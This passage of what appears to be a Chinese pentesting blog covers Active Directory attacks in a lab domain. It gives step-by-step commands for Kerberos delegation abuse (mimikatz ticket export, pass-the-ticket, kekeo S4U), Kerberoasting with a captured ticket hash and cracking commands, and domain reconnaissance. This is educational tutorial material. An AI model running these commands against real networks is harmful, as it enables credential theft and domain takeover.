用户的机器向Service1发出请求。Service1需要以用户身份访问Service2上的资源。但是，Service1没有来自用户的转发的TGT来通过转发的TGT执行委派，如指定使用转发的TGT进行Kerberos委派的图中所述。此步骤有两个先决条件。首先，Service1已通过KDC进行身份验证，并具有有效的TGT。其次，服务1具有从用户到Service1的可转发服务票证。此可转发服务票证可能已由KRB_AP_REQ消息获得，如[RFC4120] 3.2节中所指定，或由S4U2self请求获得。 Service1代表指定的用户向Service2请求服务票证。通过Service1的服务票证中的客户名称和客户领域来标识用户。还将从服务票证中复制要返回的票证中的授权数据。 如果请求中包含特权属性证书（PAC），则KDC会按照[MS-PAC] 第2.8节中的规定，通过检查PAC结构的签名数据来验证PAC 。如果PAC有效或不存在，则KDC返回Service2的服务票证，但是存储在 服务票证的cname和crealm字段中的客户端身份是用户的身份，而不是Service1的身份。 Service1使用服务票证向Service2发出请求。Service2将该请求视为来自用户，并假定用户已由KDC进行身份验证。 Service2响应该请求。 Service1响应用户对消息5的请求。 配置: 相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。 基于资源的约束委派基于资源的约束委派(Resource-Based Constrained Delegation)是一种允许资源自己去设置哪些账户委派给自己的约束委。 传统的约束委派是“正向的”，通过修改服务A属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。 而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。 非约束委派攻击利用具体操作参考此文章 域渗透-Delegation 在域中只有服务账户才能有委派功能，所以先把用户sqladmin设置为服务账号 1setspn -U -A variant&#x2F;golden sqladmin 查看配置 1setspn -l sqladmin 将sqladmin设置为非约束委派模式在域控上使用Administrator访问sqladmin所在主机Srv-Web-Kit的SMB服务。 1dir \\\\Srv-Web-Kit.rootkit.org\\c$ 在Srv-Web-Kit上通过mimikatz可以导出Administrator发送过来的TGT内容。 这里需要使用管理员权限打开mimikatz，然后通过privilege::debug命令提升权限，如果没有提升权限会报kuhl_m_sekurlsa_acquireLSA错误。 再使用sekurlsa::tickets/export命令导出内存中所有的票据。 访问域控失败将TGT内容导入到当前会话中 1kerberos::ptt [0;72744]-2-1-40e10000-Administrator@krbtgt-ROOTKIT.ORG.kirbi 导入之后已经可以访问域控的共享目录。也就是说每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。 需注意要在同一命令符下访问域控，如另起命令符则访问不成功 约束委派攻击利用假设已知配置了约束委派的账号，并且已知当前配置了约束委派的当前账户的密码。设置约束委派 kekeo工具下载通过已知的账户名和明文密码对KDC发起请求，得到TGT 1tgt::ask &#x2F;user:sqladmin &#x2F;domain:rootkit.org &#x2F;password:密码 &#x2F;ticket:sqladmin.kirbi 参数说明: 1234&#x2F;user:当前用户名&#x2F;domain:所在域名&#x2F;password:当前用户名的密码&#x2F;ticket:生成票据名称。 使用kekeo申请TGS票据 1tgs::s4u &#x2F;tgt:TGT_sqladmin@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi &#x2F;user:administrator@rootkit.org &#x2F;service:cifs&#x2F;owa2013.rootkit.org 参数说明: 123&#x2F;tgt:上一步通过kekeo生成的tgt票据&#x2F;user:想要伪造的用户名写全称（用户名@域名）&#x2F;service:想要伪造访问的服务名（服务名&#x2F;主机的FQDN名称) 使用mimikatz将生成的TGS文件导入到Kerberos凭据列表中 基于资源的约束委派攻击利用可看此文章利用资源约束委派进行的提权攻击分析 参考文章:域渗透-Delegation.mdAttack Kerberos Delegation攻击活动目录：无约束委派及域林信任利用资源约束委派进行的提权攻击分析","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"委派","slug":"委派","permalink":"https://blog.cfyqy.com/tags/%E5%A7%94%E6%B4%BE/"}],"author":"ye1s"},{"title":"域渗透之SPN","slug":"渗透之SPN","date":"2020-01-18T15:05:00.000Z","updated":"2020-04-13T07:31:36.000Z","comments":true,"path":"article/5dbd187a.html","link":"","permalink":"https://blog.cfyqy.com/article/5dbd187a.html","excerpt":"服务主体名称（SPN）是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户关联。 如果您在整个林中的计算机上安装服务的多个实例，则每个实例必须具有自己的SPN。在Kerberos身份验证服务可以使用SPN对服务进行身份验证之前，必须在该服务实例用于登录的帐户对象上注册SPN。","text":"服务主体名称（SPN）是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户关联。 如果您在整个林中的计算机上安装服务的多个实例，则每个实例必须具有自己的SPN。在Kerberos身份验证服务可以使用SPN对服务进行身份验证之前，必须在该服务实例用于登录的帐户对象上注册SPN。 SPN的类别: 12注册在AD上机器帐户(Computers)下注册在域用户帐户(Users)下 当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下;当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下 SPN格式SPN语法包含四个元素：两个必需元素和两个其他元素，您可以根据需要使用它们来产生唯一的名称 1&lt;service class&gt;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;service name&gt; 元素描述 1234&lt;service class&gt;：标识服务类的字符串,可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等&lt;host&gt;：服务所在主机名称,有两种形式,这可以是标准DNS名称或NetBIOS名称，例如server01.test.com和server01&lt;port&gt;：服务端口&lt;service name&gt;：服务的专有名称（DN），objectGuid，Internet主机名 SPN查询对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测 12setspn -q *&#x2F;* #查询当前域的所有SPNsetspn -T rootkit.org -q *&#x2F;* #查询 rookit.org域的所有SPN 查询结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768CN&#x3D;OWA2013,OU&#x3D;Domain Controllers,DC&#x3D;rootkit,DC&#x3D;org IMAP&#x2F;OWA2013 IMAP&#x2F;OWA2013.rootkit.org IMAP4&#x2F;OWA2013 IMAP4&#x2F;OWA2013.rootkit.org POP&#x2F;OWA2013 POP&#x2F;OWA2013.rootkit.org POP3&#x2F;OWA2013 POP3&#x2F;OWA2013.rootkit.org exchangeRFR&#x2F;OWA2013 exchangeRFR&#x2F;OWA2013.rootkit.org exchangeMDB&#x2F;OWA2013 exchangeMDB&#x2F;OWA2013.rootkit.org SMTP&#x2F;OWA2013 SMTP&#x2F;OWA2013.rootkit.org SmtpSvc&#x2F;OWA2013 SmtpSvc&#x2F;OWA2013.rootkit.org exchangeAB&#x2F;OWA2013 exchangeAB&#x2F;OWA2013.rootkit.org Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;OWA2013.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;ForestDnsZones.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;DomainDnsZones.rootkit.org TERMSRV&#x2F;OWA2013 TERMSRV&#x2F;OWA2013.rootkit.org DNS&#x2F;OWA2013.rootkit.org GC&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org RestrictedKrbHost&#x2F;OWA2013.rootkit.org RestrictedKrbHost&#x2F;OWA2013 RPC&#x2F;58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org HOST&#x2F;OWA2013&#x2F;ROOTKIT HOST&#x2F;OWA2013.rootkit.org&#x2F;ROOTKIT HOST&#x2F;OWA2013 HOST&#x2F;OWA2013.rootkit.org HOST&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;58650e64-9681-4c62-b26e-7914b9041f72&#x2F;rootkit.org ldap&#x2F;OWA2013&#x2F;ROOTKIT ldap&#x2F;58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;ROOTKIT ldap&#x2F;OWA2013 ldap&#x2F;OWA2013.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;rootkit.orgCN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;rootkit,DC&#x3D;org kadmin&#x2F;changepwCN&#x3D;dbadmin,OU&#x3D;运维部,DC&#x3D;rootkit,DC&#x3D;org MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org:1433 MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.orgCN&#x3D;SRV-WEB-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org TERMSRV&#x2F;SRV-WEB-KIT TERMSRV&#x2F;Srv-Web-Kit.rootkit.org WSMAN&#x2F;Srv-Web-Kit WSMAN&#x2F;Srv-Web-Kit.rootkit.org RestrictedKrbHost&#x2F;SRV-WEB-KIT HOST&#x2F;SRV-WEB-KIT RestrictedKrbHost&#x2F;Srv-Web-Kit.rootkit.org HOST&#x2F;Srv-Web-Kit.rootkit.orgCN&#x3D;PC-JERRY-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org RestrictedKrbHost&#x2F;PC-JERRY-KIT HOST&#x2F;PC-JERRY-KIT RestrictedKrbHost&#x2F;PC-jerry-Kit.rootkit.org HOST&#x2F;PC-jerry-Kit.rootkit.orgCN&#x3D;PC-MICLE-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org RestrictedKrbHost&#x2F;PC-MICLE-KIT HOST&#x2F;PC-MICLE-KIT RestrictedKrbHost&#x2F;PC-micle-Kit.rootkit.org HOST&#x2F;PC-micle-Kit.rootkit.orgCN&#x3D;PC-TORNDO-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org HOST&#x2F;PC-TORNDO-KIT HOST&#x2F;pc-torndo-Kit.rootkit.org 发现存在 SPN!以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN SPN扫描可以通过 SPN 来获取想要的信息，比如想知道域内哪些主机安装了什么服务，就不需要再进行批量的网络端口扫描。相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。 powershell执行策略默认为Restricted，不允许执行脚本。若要了解计算机上的powershell现用执行策略,请输入 1get-executionpolicy 若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，请使用以下命令将计算机上的执行策略更改为 RemoteSigned(需管理员权限) 1set-executionpolicy remotesigned GetUserSPNs.ps1 GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内注册的 SPN。脚本下载:https://github.com/nidem/kerberoast SPN扫描可以通过 SPN 来获取想要的信息，比如想知道域内哪些主机安装了什么服务，就不需要再进行批量的网络端口扫描。相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。 powershell执行策略默认为Restricted，不允许执行脚本。若要了解计算机上的powershell现用执行策略,请输入 1get-executionpolicy 若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，请使用以下命令将计算机上的执行策略更改为 RemoteSigned(需管理员权限) 1set-executionpolicy remotesigned GetUserSPNs.ps1 GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内注册的 SPN。脚本下载:https://github.com/nidem/kerberoast 1Import-module .\\GetUserSPNs.ps1 LDAP协议LDAP全称是Lightweight Directory Access Protocol，轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。 搬运daiker大佬文章中LDAP的介绍: https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1 目录树：如上图所示，在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。 条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。比如图中的每个圆圈都是一条记录。 DN,RDN:比如说第一个叶子条目，他有一个唯一可区分的名称– — DN:uid=bob,ou=people,dc=acme,dc=org。类似于文件目录的相对路径绝对路径，他除了有个DN之外，还有个RDN，他与目录结构无关，比如之前咱们提过的uid=bob,ou=people,dc=acme,dc=org，他的RDN就是uid=bob 属性：描述条目具体信息。比如 uid=bill,ou=people,dc=acme,dc=org，他有属性name 为bill，属性age为11，属性school 为xx。 Kerberoasting介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。下图为设置 Kerberos 的加密方式为RC4，在域中可以在域控的「本地安全策略」中进行设置： 设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。 Kerberoasting攻击方式一获得有价值的SPN需要满足以下条件： 12该SPN注册在域用户帐户(Users)下域用户账户的权限很高 1.获取SPN powershell:https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1 vbs:https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs 1cscript GetUserSPNs.vbs 2.根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请 ST 票据。 12Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org&quot; 3.Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。 1klist 4.mimicatz导出 1rberos::list &#x2F;export 5.爆破密码 脚本:https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py 1python2 tgsrepcrack.py wordlist.txt 1-40a10000-jerry@MSSQLSvc~Srv-Web-Kit.rootkit.org-ROOTKIT.ORG.kirbi Kerberoasting攻击方式二Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。 自动实现，并且不需要mimikatz，普通用户权限即可，参考资料http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/ 脚本地址：https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1 12Import-module .\\Invoke-Kerberoast.ps1Invoke-kerberoast -outputformat hashcat |fl –outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat 两种格式 利用hashcat爆破工具下载:https://github.com/hashcat/hashcat 1hashcat64.exe -m 13100 hash.txt dic.txt --force --show hash.txt内容 1$krb5tgs$23$*dbadmin$rootkit.org$MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org:1433*$d78f3a872b2e770bd7fed0a08386d791$2a356ecded8ad719cde070eb0c25bd1126dce5017acfb219135760a3890428da51667504789cb12c15fa61c71209ffc3ed0cd1d7e08cbeb4bb2bbc84d42bac53f4030bbf8fff011bcfcd76e2448f8b34f1431da0ba5f373c737d12004562b4242b099c2f27797cd682902f70f356f5fa629ea7c55458ebd230eaa19c56f596e1e1e6e2d37887bddca6243661c3d1d8e69420a3ab4427c56859d3858f6b4283fc268a1f4af161771d37858226a4d640f0cb45648760d7c5698cfbcc1e53003277e462937d09da38e8c1bfd698e6d6db5fc184fa9166c5bf8002cb061b53187612d597ad3a547b4a2b6cd474bcb894c6d1ff021299882dd4ba9d37fe5543bbb205b5941cb24891f3f1733dd012dda97a81d8cb0206bfca3b9ae8a0087466fb91b1bea820a3608f71eb90a50d46ca1944816242d75ddae569cdf33bad5fb8f5703c252dbfce22cfa8ab268d16671020044282f88119854a01500216364329e89b37367516d0f21f9d2f6b20b886e3a01424b90431ffc7782a21a6befe40514cdfb704c29a2bd25078e821209d914df46fb11c997c7cf9e0ec94c036466cd51351c132304ff8a2bbdd8120a955b7ef764169193c8915dc123d6c339a5c2d7bae301f0effdaaa604cc84a4f36f005bbbf64f1cb276b265fc953e7b3c09cdbc4ec102edd8907fcf812088e7ab7ab1d3d1efe07c899f9f590ee1a8fa7714e5b5e7b82b072aa46dae2bf9566cca99877932021b506ddb51e3162a576e155ff0c40e6eb1546b7713d355475c4df227864e4a3e7d12c3c0d6f1020f738b041c4717aa626ef8a3c9974bda28f2d058dfc2a90bd6aea7a6352c07999744e9b936b34b372ffd85153bec7ea17c80cab0ab0f165b638fc43917df16c8dc37d664d952cb615bbf95809bcc046761cefc39eb01b2b0160d31701ed33f3d9ffafafbf931c3f698ab57550da5fb50b009aa27e1dcb3fdfcf9d68b44882b065dedb15252c3762b2ff98c197e87f4a04831ed8dda78e71a9744a655fde06064a8a7b19caa0845436ceadc279e3d50fb21982d9303f96470705f85f4ab1544d54f2a39f98fc5bcab97ad124b7aeffb45ccb356c043ee2949bdffb1fe0607b608051bc300b736d1add8f2cf50f508fe8b3e624f1d512cff8ed1f894a2836ea9fc960c5a87933f793a1f059f51d640353e01eedfaf5b41a60ba2b779d7e27e29d83fc584cb3ad7c52d746c1fd1d8b38840d3533e9ab0dc96110d509ab41735253a3354c3bcaa97acde9f6f2d9abe6ca1cea1e4b9df500b0567215571d8360f5f55b1dda171c2db476e2888eee7dfefb9a22909729350a4307d1f606a5ddb615a29ea3b54194f216f92c2161e3d998044c811675e86f913140e0e2d290da20141a9fe488ea715c1562f6425e30b54261e44b8e83430456c2b11e08d227b209f4c992089d8ac633e59d0ccbe15e5c06 爆破结果","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"SPN","slug":"SPN","permalink":"https://blog.cfyqy.com/tags/SPN/"}],"author":"ye1s"},{"title":"域的基础知识","slug":"域的基础知识","date":"2020-01-07T15:13:00.000Z","updated":"2020-04-13T07:32:19.000Z","comments":true,"path":"article/4e0f5702.html","link":"","permalink":"https://blog.cfyqy.com/article/4e0f5702.html","excerpt":"域知识的一些基础概念。","text":"域知识的一些基础概念。 工作组定义：具有不同名称的计算机可以具有相同的工作组名称，从而可以利用工作组名称进行快速筛选 问题：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的） 用户在登录时，计算机为用户构造令牌（sid）以及用户所在工作组的令牌（sid），计算机将依据工作组的sid来判断当前用户的权限 域 域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。 活动目录活动目录（Active Directory），AD：活动目录是Windows Server在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。 活动目录里的每个对象都有一个识别名，用来识别对象所在的域以及到达对象的路径。 活动目录里的一个典型识别名是： 1CN&#x3D;Tony Patton,OU&#x3D;Contributors,DC&#x3D;TechRepublic 这个识别名由下面这几部分组成： 123CN：公共名，用来定义目录下的对象。在本文里，公共名是Tony Patton。OU：对象所属的组织单位。DC：对象的域。也就是用于活动目录的DNS名称，在我们的例子里是TechRepublic。 活动目录和域的关系： 域是逻辑上的服务器以及PC的逻辑分组，在一个域里面的用户都使用公共的安全机制和账户信息。 活动目录将域中的资源组织在一起，存放这些资源的各种信息 域控制器域控（Domain Controller）: 在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）” 域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。 安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 域树域树（Tree）：一个域下还可能会有子域，从而构成域树 注：树是有父和子之分的，父域和子域的名称之间是有沿用关系的；树与树之间是没有这种延用关系的；新域就是一个林，只不过这个林只有一棵树。 域林域林（Forest）：多个域树整体将构成域林。 域、域树、域林的理解: 在一个活动目录中可以根据需要建立多个域，比方说“甲公司”的财务科、人事科、销售科就可以各建一个域，因为这几个域同属甲公司，所以就可以将这几个域构成一棵域树并交给域树管理，这棵域树就是甲公司。又因为，甲公司、乙公司、丙公司都归属A集团，那么为了让A集团可以更好地管理这三家子公司，就可以将这三家公司的域树集中起来组成域森林（即A集团）。 活动目录目录服务活动目录目录服务（Active Directory Directory Services），ADDS： ADDS提供给域管理一个集中管理的机制和架构。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。ADDS可以让域管理员对网络中的所有资源进行访问（登陆，读写等操作）我们可以将其理解为单点登录。 活动目录目录服务提供的功能 （1）提供单点登录访问服务器、服务器上指定的资源与应用程序。 （2）多播复制（Replicatiion）／／暂时不关心 （3）基于属性搜索 eg:基于文件名搜索 （4）基于分类搜索 eg:基于分类搜索 信任密钥信任密钥：计算机在加入域的时候需要由域用户进行“介绍”，之后计算机和DC之间会建立信任关系–即生成只有两方知道的信任密钥 参考文章:域基础知识解析","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"域基础","slug":"域基础","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E5%9F%BA%E7%A1%80/"}],"author":"ye1s"},{"title":"域渗透之信息收集","slug":"渗透之信息收集","date":"2020-01-06T15:20:01.000Z","updated":"2020-04-13T07:45:46.000Z","comments":true,"path":"article/24bbdb84.html","link":"","permalink":"https://blog.cfyqy.com/article/24bbdb84.html","excerpt":"转载 域渗透-域内信息收集","text":"转载 域渗透-域内信息收集 域信息收集命令1234567891011121314Net useNet viewTasklist &#x2F;vIpconfig &#x2F;all net group &#x2F;domain 获得所有域用户组列表net group “domain admins” &#x2F;domain 获得域管理员列表net group “enterprise admins” &#x2F;domain 获得企业管理员列表net localgroup administrators &#x2F;domain 获取域内置administrators组用户（enterprise admins、domain admins）net group “domain controllers” &#x2F;domain 获得域控制器列表net group “domain computers” &#x2F;domain 获得所有域成员计算机列表net user &#x2F;domain 获得所有域用户列表net user someuser &#x2F;domain 获得指定账户someuser的详细信息net accounts &#x2F;domain 获得域密码策略设置，密码长短，错误锁定等信息nltest &#x2F;domain_trusts 获取域信任信息 SPN扫描不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。 大部分win系统默认已自带spn探测工具即：setspn.exe此操作无需管理权限域内机器执行 1setspn -T target.com -Q *&#x2F;* 可完整查出当前域内所有spn。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172C:\\Users\\jerry.ROOTKIT&gt;setspn -T rootkit.org -Q *&#x2F;*正在检查域 DC&#x3D;rootkit,DC&#x3D;orgCN&#x3D;OWA2013,OU&#x3D;Domain Controllers,DC&#x3D;rootkit,DC&#x3D;org IMAP&#x2F;OWA2013 IMAP&#x2F;OWA2013.rootkit.org IMAP4&#x2F;OWA2013 IMAP4&#x2F;OWA2013.rootkit.org POP&#x2F;OWA2013 POP&#x2F;OWA2013.rootkit.org POP3&#x2F;OWA2013 POP3&#x2F;OWA2013.rootkit.org exchangeRFR&#x2F;OWA2013 exchangeRFR&#x2F;OWA2013.rootkit.org exchangeMDB&#x2F;OWA2013 exchangeMDB&#x2F;OWA2013.rootkit.org SMTP&#x2F;OWA2013 SMTP&#x2F;OWA2013.rootkit.org SmtpSvc&#x2F;OWA2013 SmtpSvc&#x2F;OWA2013.rootkit.org exchangeAB&#x2F;OWA2013 exchangeAB&#x2F;OWA2013.rootkit.org Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;OWA2013.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;ForestDnsZones.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;DomainDnsZones.rootkit.org TERMSRV&#x2F;OWA2013 TERMSRV&#x2F;OWA2013.rootkit.org DNS&#x2F;OWA2013.rootkit.org GC&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org RestrictedKrbHost&#x2F;OWA2013.rootkit.org RestrictedKrbHost&#x2F;OWA2013 RPC&#x2F;58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org HOST&#x2F;OWA2013&#x2F;ROOTKIT HOST&#x2F;OWA2013.rootkit.org&#x2F;ROOTKIT HOST&#x2F;OWA2013 HOST&#x2F;OWA2013.rootkit.org HOST&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;58650e64-9681-4c62-b26e-7914b9041f72&#x2F;rootkit.org ldap&#x2F;OWA2013&#x2F;ROOTKIT ldap&#x2F;58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;ROOTKIT ldap&#x2F;OWA2013 ldap&#x2F;OWA2013.rootkit.org ldap&#x2F;OWA2013.rootkit.org&#x2F;rootkit.orgCN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;rootkit,DC&#x3D;org kadmin&#x2F;changepwCN&#x3D;dbadmin,OU&#x3D;运维部,DC&#x3D;rootkit,DC&#x3D;org MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org:1433 MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.orgCN&#x3D;SRV-WEB-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org TERMSRV&#x2F;SRV-WEB-KIT TERMSRV&#x2F;Srv-Web-Kit.rootkit.org WSMAN&#x2F;Srv-Web-Kit WSMAN&#x2F;Srv-Web-Kit.rootkit.org RestrictedKrbHost&#x2F;SRV-WEB-KIT HOST&#x2F;SRV-WEB-KIT RestrictedKrbHost&#x2F;Srv-Web-Kit.rootkit.org HOST&#x2F;Srv-Web-Kit.rootkit.orgCN&#x3D;PC-JERRY-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org RestrictedKrbHost&#x2F;PC-JERRY-KIT HOST&#x2F;PC-JERRY-KIT RestrictedKrbHost&#x2F;PC-jerry-Kit.rootkit.org HOST&#x2F;PC-jerry-Kit.rootkit.orgCN&#x3D;PC-MICLE-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org RestrictedKrbHost&#x2F;PC-MICLE-KIT HOST&#x2F;PC-MICLE-KIT RestrictedKrbHost&#x2F;PC-micle-Kit.rootkit.org HOST&#x2F;PC-micle-Kit.rootkit.orgCN&#x3D;PC-TORNDO-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org HOST&#x2F;PC-TORNDO-KIT HOST&#x2F;pc-torndo-Kit.rootkit.org发现存在 SPN! 定位域控查询dns解析记录 若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。 1nslookup -type&#x3D;all _ldap._tcp.dc._msdcs.rootkit.org net group 1net group &quot;domain controllers&quot; &#x2F;domain 端口识别扫描内网中同时开放389和53端口的机器。 1234567端口：389服务：LDAP、ILS说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。端口：53服务：Domain Name Server（DNS）说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放。 SPN扫描 adfindadfind下载地址:http://www.joeware.net/freetools/tools/adfind/index.htm列出域控制器名称： 1AdFind -sc dclist 查询当前域中在线的计算机： 1AdFind -sc computers_active 查询当前域中在线的计算机(只显示名称和操作系统)： 1AdFind -sc computers_active name operatingSystem 查询当前域中所有计算机： 1AdFind -f &quot;objectcategory&#x3D;computer&quot; 查询当前域中所有计算机(只显示名称和操作系统)： 1AdFind -f &quot;objectcategory&#x3D;computer&quot; name operatingSystem 查询域内所有用户： 1AdFind -users name 查询所有GPO： 1AdFind -sc gpodmp 参考文章: 域渗透-域内信息收集","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"域信息收集","slug":"域信息收集","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"ye1s"},{"title":"XSS + CSRF ","slug":"XSS-SSRF","date":"2020-01-06T12:40:00.000Z","updated":"2020-04-13T08:25:38.988Z","comments":true,"path":"article/d718e0b1.html","link":"","permalink":"https://blog.cfyqy.com/article/d718e0b1.html","excerpt":"XSS 漏洞利用方式，最直接的就是盗取cookie，使用cookie实现用户登录。 但如果有 